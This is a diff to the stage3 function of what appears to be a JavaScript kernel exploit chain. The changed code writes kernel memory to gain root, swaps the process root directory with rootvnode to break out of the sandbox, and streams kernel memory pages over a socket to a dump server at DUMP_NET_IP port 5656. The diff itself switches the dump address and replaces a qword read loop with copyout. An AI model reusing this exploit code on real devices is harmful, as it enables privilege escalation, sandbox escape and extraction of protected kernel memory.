@@ -1423,7 +1423,7 @@ function stage3() {
     kernel_write8(libkernel_ref_addr, new int64(1, 0));
 	
 	let cur_uid = chain.syscall(0x018);
-    alert("[+] we root now? uid=0x" + cur_uid);
+    debug_log("[+] we root now? uid=0x" + cur_uid);
 	
 	let rootvnode =  kernel_read8(get_kaddr(ROOTVNODE_OFFSET));
      kernel_write8(proc_fd.add32(0x10), rootvnode); // fd_rdir
@@ -1433,9 +1433,9 @@ function stage3() {
     debug_log("[+] we escaped now? in sandbox: " + is_in_sandbox);
   
 
-	alert("authid: " + kernel_read8(proc_ucred.add32(0x58)));
+  alert("authid: " + kernel_read8(proc_ucred.add32(0x58)));
   
-  let dump_addr = get_kaddr(0x1526600);
+  let dump_addr = get_kaddr(0x50F3C00);
   let dump_page = p.malloc(0x1000);
 
   alert("about to dump kernel (0x" + dump_addr + "), ensure dump server is running (" + DUMP_NET_IP + ":5656)...");
@@ -1444,10 +1444,9 @@ function stage3() {
   alert("connected dump sock? 0x" + connect_res);
 
   for (let pfn = 0; ; pfn++) {
-    for (let off = 0; off < 0x1000; off += 0x8) {
-      let qword = kernel_read8(dump_addr.add32((pfn * 0x1000) + off));
-      p.write8(dump_page.add32(off), qword);
-    }
+    
+      copyout(dump_addr.add32((pfn * 0x1000)), dump_page, 0x1000);
+    
 
     
     let write_res = chain.syscall(0x004, dump_sock_fd, dump_page, 0x1000);
